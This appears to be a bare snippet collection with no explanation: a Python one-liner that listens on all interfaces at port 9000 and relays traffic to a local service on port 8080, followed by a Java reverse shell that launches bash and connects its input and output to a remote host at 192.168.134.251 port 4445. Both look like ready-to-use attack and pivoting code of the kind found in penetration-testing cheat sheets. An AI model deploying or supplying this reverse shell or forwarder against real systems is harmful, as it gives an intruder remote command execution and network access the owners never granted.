    python3 -c 'import socket,select;l=socket.socket();l.bind(("0.0.0.0",9000));l.listen(5);print("Forwarding 0.0.0.0:9000 -> 127.0.0.1:8080...");\
    while True:\
      r,_,_=select.select([l],[],[]);c,a=l.accept();t=socket.socket();t.connect(("127.0.0.1",8080));\
      while True:\
        rr,_,_=select.select([c,t],[],[]);\
        if c in rr:\
          d=c.recv(4096)\
          if not d:break\
          t.sendall(d)\
        if t in rr:\
          d=t.recv(4096)\
          if not d:break\
          c.sendall(d)\
      c.close();t.close()'

---

    String host="192.168.134.251";
    int port=4445;
    String cmd="bash";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
